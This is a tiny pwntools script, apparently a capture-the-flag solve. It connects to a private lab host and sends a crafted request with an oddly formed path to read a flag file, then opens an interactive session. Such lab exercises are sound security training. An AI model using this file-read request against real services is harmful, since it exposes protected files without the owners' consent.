from pwn import *

p = remote('192.168.5.1',7070)
print(p.recv())
p.sendline(r'GETducky "\shared\/flag" 0')
p.interactive()